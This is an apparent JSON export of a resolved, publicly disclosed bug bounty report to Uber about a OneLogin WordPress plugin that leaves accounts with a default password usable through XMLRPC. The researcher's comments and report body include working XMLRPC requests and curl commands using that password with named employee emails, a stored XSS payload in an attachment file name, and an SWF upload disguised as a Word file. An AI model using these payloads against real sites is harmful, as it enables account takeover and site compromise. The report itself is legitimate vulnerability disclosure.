{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-06-28T17:35:32.085Z", 
    "voters": [
        "michiel", 
        "bobrov", 
        "hunter", 
        "wkcaj", 
        "shailesh4594", 
        "mongo", 
        "zombiehelp54", 
        "try_to_hack", 
        "geekboy", 
        "mdv", 
        "and 39 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "7000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 138869, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-07-15T22:04:09.137Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "OneLogin authentication bypass on WordPress sites via XMLRPC", 
    "is_member_of_team?": null, 
    "vote_count": 49, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-07-28T17:35:32.175Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$7,000", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-05-15T16:02:53.094Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-15T16:02:53.094Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "After some problems with XML encoding I was able to upload a working SWF file on *newsroom.uber.com*. The file extension and Content-type given by the server are that of a MS Word document but embedding the uploaded SWF file is still possible.\n\nIf a victim views such Flash app while logged on, then the attacker can send GET and POST requests on their behalf with appropriate cookies. If it's an administrator, then the site contents, settings, and user accounts can be modified and the server probably compromised.\n\nI made a PoC available at https://klikki.fi/ubdemo29767346.html (non-public URL of course). The page contains an embedded Flash app from https://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc .\n\nThe Flash app (directed by JavaScript calls you see with view source) does a GET request to the *newsroom* front page and displays the HTML. An exploit targeting administrators would GET HTML forms in /wp-admin/, parse CSRF tokens, and send POST requests to submit those forms.\n", 
            "markdown_message": "<p>After some problems with XML encoding I was able to upload a working SWF file on <em>newsroom.uber.com</em>. The file extension and Content-type given by the server are that of a MS Word document but embedding the uploaded SWF file is still possible.</p>\n\n<p>If a victim views such Flash app while logged on, then the attacker can send GET and POST requests on their behalf with appropriate cookies. If it&#39;s an administrator, then the site contents, settings, and user accounts can be modified and the server probably compromised.</p>\n\n<p>I made a PoC available at <a title=\"https://klikki.fi/ubdemo29767346.html\" href=\"/redirect?signature=d8f5b919f7607a0ec7ae9e376c49adb5bdd20376&amp;url=https%3A%2F%2Fklikki.fi%2Fubdemo29767346.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://klikki.fi/ubdemo29767346.html</span><i class=\"icon-external-link\"></i></a> (non-public URL of course). The page contains an embedded Flash app from <a title=\"https://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc\" href=\"/redirect?signature=f13e530280612d6b16a882ed971120d28523b5af&amp;url=https%3A%2F%2Fnewsroom.uber.com%2Fus-new-york%2Fwp-content%2Fuploads%2Fsites%2F295%2F2016%2F05%2Fthigrwfjeg-swf.doc\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc</span><i class=\"icon-external-link\"></i></a> .</p>\n\n<p>The Flash app (directed by JavaScript calls you see with view source) does a GET request to the <em>newsroom</em> front page and displays the HTML. An exploit targeting administrators would GET HTML forms in /wp-admin/, parse CSRF tokens, and send POST requests to submit those forms.</p>\n", 
            "type": "Activities::Comment", 
            "id": 958145, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-16T20:59:06.955Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-16T20:59:06.955Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Thanks @jouko, running this down now. ", 
            "markdown_message": "<p>Thanks <a href=\"/jouko\">@jouko</a>, running this down now. </p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 959931, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-16T21:41:49.354Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-16T21:41:49.354Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Hey @jouko I just went over our Wordpress users and was unable to reproduce this. What user were you spoofing to upload that file?", 
            "markdown_message": "<p>Hey <a href=\"/jouko\">@jouko</a> I just went over our Wordpress users and was unable to reproduce this. What user were you spoofing to upload that file?</p>\n", 
            "type": "Activities::Comment", 
            "id": 959992, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-16T22:08:13.694Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-16T22:08:13.694Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Additionally it doesn't appear those posts were created (at least as the URIs specified). I can search for them once I have the account name though.", 
            "markdown_message": "<p>Additionally it doesn&#39;t appear those posts were created (at least as the URIs specified). I can search for them once I have the account name though.</p>\n", 
            "type": "Activities::Comment", 
            "id": 960041, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-16T22:36:50.653Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-16T22:36:50.653Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "The SWF file is there, https://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc . I uploaded it with cbarry@uber.com. The posts might not be accessible via those URLs because they're saved as drafts.  I think I used the same user on newsroom/us-new-york/ (he didn't have posting right on the global site). The account I tested on love.uber.com/australia/ was probably amrita.sareen@uber.com.\n\n", 
            "markdown_message": "<p>The SWF file is there, <a title=\"https://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc\" href=\"/redirect?signature=f13e530280612d6b16a882ed971120d28523b5af&amp;url=https%3A%2F%2Fnewsroom.uber.com%2Fus-new-york%2Fwp-content%2Fuploads%2Fsites%2F295%2F2016%2F05%2Fthigrwfjeg-swf.doc\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://newsroom.uber.com/us-new-york/wp-content/uploads/sites/295/2016/05/thigrwfjeg-swf.doc</span><i class=\"icon-external-link\"></i></a> . I uploaded it with <a title=\"cbarry@uber.com\" href=\"mailto:cbarry@uber.com\" rel=\"nofollow noopener noreferrer\">cbarry@uber.com</a>. The posts might not be accessible via those URLs because they&#39;re saved as drafts.  I think I used the same user on newsroom/us-new-york/ (he didn&#39;t have posting right on the global site). The account I tested on love.uber.com/australia/ was probably <a title=\"amrita.sareen@uber.com\" href=\"mailto:amrita.sareen@uber.com\" rel=\"nofollow noopener noreferrer\">amrita.sareen@uber.com</a>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 960078, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-16T22:47:21.994Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-16T22:47:21.994Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "You can probably find the drafts if you go to the Dashboard of the correct sites and go to the Posts menu. The URLs I gave contain the post ID's the XMLRPC reply gave me. It doesn't give direct URLs.", 
            "markdown_message": "<p>You can probably find the drafts if you go to the Dashboard of the correct sites and go to the Posts menu. The URLs I gave contain the post ID&#39;s the XMLRPC reply gave me. It doesn&#39;t give direct URLs.</p>\n", 
            "type": "Activities::Comment", 
            "id": 960093, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-17T05:23:59.007Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-17T05:30:12.316Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "I was thinking about more ways to achieve RCE with this. Creating posts or pages containing `<script>` doesn't probably work except if you can guess/find an administrator account with the default password.\n\nOne way to inject JS into the admin panel via XMLRPC is to create an attachment. This should work with any account that can publish something. Some pages don't HTML-escape the file name, creating a stored XSS in the administration panel. Example request:\n\n~~~~ xml\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>wp.newPost</methodName>\n<params>\n        <param><value>empty</value></param>\n        <param><value>cbarry@uber.com</value></param>\n        <param><value>@@@nopass@@@</value></param>\n        <param><struct>\n                <member><name>post_title</name><value>aaa</value></member>\n                <member><name>post_type</name><value>attachment</value></member>\n                <member><name>post_content</name><value>bbb</value></member>\n                <member><name>post_status</name><value>publish</value></member>\n                <member><name>file</name><value>bugbounty'&gt;test&lt;img src=x onerror=alert('xss') onload=alert('xss')&gt;</value></member>\n        </struct></param>       \n</params>\n</methodCall>\n~~~~\nIt can be sent with the command e.g.\n~~~~ sh\ncurl 'https://newsroom.uber.com/us-new-york/xmlrpc.php' --data-binary \"`cat xss.xml`\" -H 'Content-type: application/xml'\n~~~~\nThe root /xmlrpc.php URL gave a 403 Forbidden error, but the API is still reachable via the individual sites, e.g.  https://newsroom.uber.com/us-new-york/xmlrpc.php . Based on my test the request seemed to work and I got the ID of the newly created attachment as response.\n\n(This doesn't actually upload an attachment, but inserts a representation of a media attachment in the database. The file needn't actually exist.)\n\nThe XSS should get triggered  when an administrator clicks the Media menu in the Dashboard (of the New York site, not the global site which doesn't seem exploitable now). The media list has two modes (list and grid), but the vulnerable *list* mode is apparently the default.\n", 
            "markdown_message": "<p>I was thinking about more ways to achieve RCE with this. Creating posts or pages containing <code>&lt;script&gt;</code> doesn&#39;t probably work except if you can guess/find an administrator account with the default password.</p>\n\n<p>One way to inject JS into the admin panel via XMLRPC is to create an attachment. This should work with any account that can publish something. Some pages don&#39;t HTML-escape the file name, creating a stored XSS in the administration panel. Example request:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot;?&gt;</span>\n<span class=\"nt\">&lt;methodCall&gt;</span>\n<span class=\"nt\">&lt;methodName&gt;</span>wp.newPost<span class=\"nt\">&lt;/methodName&gt;</span>\n<span class=\"nt\">&lt;params&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>empty<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>cbarry@uber.com<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>@@@nopass@@@<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;struct&gt;</span>\n                <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>post_title<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>aaa<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n                <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>post_type<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>attachment<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n                <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>post_content<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>bbb<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n                <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>post_status<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>publish<span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n                <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>file<span class=\"nt\">&lt;/name&gt;&lt;value&gt;</span>bugbounty&#39;<span class=\"ni\">&amp;gt;</span>test<span class=\"ni\">&amp;lt;</span>img src=x onerror=alert(&#39;xss&#39;) onload=alert(&#39;xss&#39;)<span class=\"ni\">&amp;gt;</span><span class=\"nt\">&lt;/value&gt;&lt;/member&gt;</span>\n        <span class=\"nt\">&lt;/struct&gt;&lt;/param&gt;</span>       \n<span class=\"nt\">&lt;/params&gt;</span>\n<span class=\"nt\">&lt;/methodCall&gt;</span>\n</code></pre>\n<p>It can be sent with the command e.g.</p>\n<pre class=\"highlight shell\"><code>curl <span class=\"s1\">&#39;https://newsroom.uber.com/us-new-york/xmlrpc.php&#39;</span> --data-binary <span class=\"s2\">&quot;</span><span class=\"sb\">`</span>cat xss.xml<span class=\"sb\">`</span><span class=\"s2\">&quot;</span> -H <span class=\"s1\">&#39;Content-type: application/xml&#39;</span>\n</code></pre>\n<p>The root /xmlrpc.php URL gave a 403 Forbidden error, but the API is still reachable via the individual sites, e.g.  <a title=\"https://newsroom.uber.com/us-new-york/xmlrpc.php\" href=\"/redirect?signature=03c209515ea94d53d0e4ea20b2e4fb586c5558a7&amp;url=https%3A%2F%2Fnewsroom.uber.com%2Fus-new-york%2Fxmlrpc.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://newsroom.uber.com/us-new-york/xmlrpc.php</span><i class=\"icon-external-link\"></i></a> . Based on my test the request seemed to work and I got the ID of the newly created attachment as response.</p>\n\n<p>(This doesn&#39;t actually upload an attachment, but inserts a representation of a media attachment in the database. The file needn&#39;t actually exist.)</p>\n\n<p>The XSS should get triggered  when an administrator clicks the Media menu in the Dashboard (of the New York site, not the global site which doesn&#39;t seem exploitable now). The media list has two modes (list and grid), but the vulnerable <em>list</em> mode is apparently the default.</p>\n", 
            "type": "Activities::Comment", 
            "id": 960532, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-26T05:29:15.077Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-26T05:29:15.077Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "FYI, Automattic confirmed this \"stored XSS via attachment name\" which is one way to exploit the default passwords. A fix is planned to be included in an upcoming WordPress release \"in few weeks\".", 
            "markdown_message": "<p>FYI, Automattic confirmed this &quot;stored XSS via attachment name&quot; which is one way to exploit the default passwords. A fix is planned to be included in an upcoming WordPress release &quot;in few weeks&quot;.</p>\n", 
            "type": "Activities::Comment", 
            "id": 984483, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "jouko", 
                "url": "/jouko"
            }, 
            "created_at": "2016-06-15T16:57:23.459Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-15T16:57:23.459Z", 
            "actor": {
                "username": "mandatoryuber", 
                "url": "/mandatoryuber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/040/287/d8b3fb7946b40427a07c98958bf2081bbd60daec_medium.jpeg?1442852902"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1015414, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-15T17:41:13.169Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-15T17:41:13.169Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "How is the bounty situation? The WordPress core bug described above (stored XSS via attachment file name) is exploitable independently of the OneLogin plugin. An attacker who compromises a lower-level account could inject JavaScript to admin users and therefore control site contents, create new users, escalate to RCE, etc.", 
            "markdown_message": "<p>How is the bounty situation? The WordPress core bug described above (stored XSS via attachment file name) is exploitable independently of the OneLogin plugin. An attacker who compromises a lower-level account could inject JavaScript to admin users and therefore control site contents, create new users, escalate to RCE, etc.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1015538, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-06-28T16:11:55.570Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-28T16:11:55.570Z", 
            "actor": {
                "url": "/uber", 
                "profile": {
                    "name": "Uber"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/314/0010251d7088db2a1b236eb594b6371af4492609_medium.png?1514905146"
                }
            }, 
            "team_handle": "uber", 
            "bounty_amount": "7000.0", 
            "collaborator": {
                "username": "jouko", 
                "url": "/jouko"
            }, 
            "message": "Thanks for the great find!", 
            "markdown_message": "<p>Thanks for the great find!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 1043363, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-28T17:33:54.972Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-28T17:33:54.972Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "thanks!", 
            "markdown_message": "<p>thanks!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1043560, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-28T17:35:32.134Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-28T17:35:32.134Z", 
            "actor": {
                "username": "jouko", 
                "url": "/jouko", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/642/ac126b9d3c3ae610b07da9ea3070cf3f55d55aff_medium.jpg?1423004250"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1043564, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-15T22:04:09.207Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-15T22:04:09.207Z", 
            "actor": {
                "username": "lyoung-uber", 
                "url": "/lyoung-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/873/a15c66b0ad7834ebe7cd48006c61b58bfe42514e_medium.jpg?1466112878"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "Thanks again for the report @jouko, keep them coming!", 
            "markdown_message": "<p>Thanks again for the report <a href=\"/jouko\">@jouko</a>, keep them coming!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1071317, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-15T22:04:09.309Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-15T22:04:09.309Z", 
            "actor": {
                "username": "lyoung-uber", 
                "url": "/lyoung-uber", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/079/873/a15c66b0ad7834ebe7cd48006c61b58bfe42514e_medium.jpg?1466112878"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "uber", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1071318, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "jouko", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jouko", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/013/642/84ded716b305011af6c7091e630ca8ac2c590a87_small.jpg?1423004250"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 70, 
        "name": "Code Injection"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -74409370.6782336, 
    "disclosed_at": "2016-07-15T22:04:09.271Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/138869", 
    "created_at": "2016-05-15T00:03:20.825Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>When a user logs on one of your WordPress sites via OneLogin, the authentication plugin creates a new entry in the WordPress user database with the default password <code>@@@nopass@@@</code>. This wouldn&#39;t be a problem if the plugin disabled all normal WordPress authentication methods, but it doesn&#39;t.</p>\n\n<p>The OneLogin plugin does prevent logins through the normal <em>wp-login.php</em> page but fails to restrict the XMLRPC API. XMLRPC still honors the WordPress internal user database. Depending on the plugin settings, also the normal login page can be used with URL parameters: <code>wp-login.php?normal=1</code>. The settings did not allow this on the Uber sites I tried.</p>\n\n<p>An attacker can exploit this bug by performing XMLRPC functions such as create new pages or posts and upload files. The attacker has to guess or know a username that has a default password and sufficient privileges to execute the operation. I haven&#39;t done an exhaustive test of all functions but some of them could probably be used to achieve remote code execution (e.g. creating posts containing JavaScript).</p>\n\n<p>This probably affects most of your WordPress sites. I&#39;ve confirmed this on <em>love.uber.com</em> and <em>newsroom.uber.com</em> by creating pages and posts (not public) and uploading files.</p>\n\n<p>The XMLRPC system supports about 80 functions by default. Almost all of them require authentication. Plugins may add their own functions. Some of the function names:</p>\n<pre class=\"highlight plaintext\"><code>wp.deleteFile\nwp.editComment\nwp.getOptions\nwp.getUsers\nwp.newPage\nwp.newPost\nwp.setOptions\nwp.uploadFile\n</code></pre>\n<h1 id=\"reproducing\">Reproducing</h1>\n\n<p>Create an XML file named <code>options.xml</code> containing:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot;?&gt;</span>\n<span class=\"nt\">&lt;methodCall&gt;</span>\n<span class=\"nt\">&lt;methodName&gt;</span>wp.getOptions<span class=\"nt\">&lt;/methodName&gt;</span>\n<span class=\"nt\">&lt;params&gt;</span>\n    <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>zzz<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>cbarry@uber.com<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n        <span class=\"nt\">&lt;param&gt;&lt;value&gt;</span>@@@nopass@@@<span class=\"nt\">&lt;/value&gt;&lt;/param&gt;</span>\n<span class=\"nt\">&lt;/params&gt;</span>\n<span class=\"nt\">&lt;/methodCall&gt;</span>\n</code></pre>\n<p>Run the UNIX command:</p>\n<pre class=\"highlight shell\"><code>curl <span class=\"s1\">&#39;https://newsroom.uber.com/xmlrpc.php&#39;</span> --data-binary <span class=\"s2\">&quot;</span><span class=\"sb\">`</span>cat options.xml<span class=\"sb\">`</span><span class=\"s2\">&quot;</span> -H <span class=\"s1\">&#39;Content-type: application/xml&#39;</span>\n</code></pre>\n<p>You should get the response:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>\n<span class=\"nt\">&lt;methodResponse&gt;</span>\n  <span class=\"nt\">&lt;params&gt;</span>\n    <span class=\"nt\">&lt;param&gt;</span>\n      <span class=\"nt\">&lt;value&gt;</span>\n      <span class=\"nt\">&lt;struct&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>software_name<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;struct&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>desc<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>Software Name<span class=\"nt\">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>readonly<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;boolean&gt;</span>1<span class=\"nt\">&lt;/boolean&gt;&lt;/value&gt;&lt;/member&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>value<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>WordPress<span class=\"nt\">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span>\n<span class=\"nt\">&lt;/struct&gt;&lt;/value&gt;&lt;/member&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>software_version<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;struct&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>desc<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>Software Version<span class=\"nt\">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>readonly<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;boolean&gt;</span>1<span class=\"nt\">&lt;/boolean&gt;&lt;/value&gt;&lt;/member&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>value<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>4.4.3<span class=\"nt\">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span>\n<span class=\"nt\">&lt;/struct&gt;&lt;/value&gt;&lt;/member&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>blog_url<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;struct&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>desc<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>WordPress Address (URL)<span class=\"nt\">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>readonly<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;boolean&gt;</span>1<span class=\"nt\">&lt;/boolean&gt;&lt;/value&gt;&lt;/member&gt;</span>\n  <span class=\"nt\">&lt;member&gt;&lt;name&gt;</span>value<span class=\"nt\">&lt;/name&gt;&lt;value&gt;&lt;string&gt;</span>https://newsroom.uber.com<span class=\"nt\">&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;</span>\n...etc.\n</code></pre>\n<h1 id=\"exploit-scenarios\">Exploit scenarios</h1>\n\n<p>Options in the above output that aren&#39;t marked <em>readonly</em> can also be changed. I didn&#39;t check if this is exploitable.</p>\n\n<p>For usernames in these PoCs I used some *@uber.com email addresses I saw while testing previous bugs. They would be relatively easily guessable/findable for an 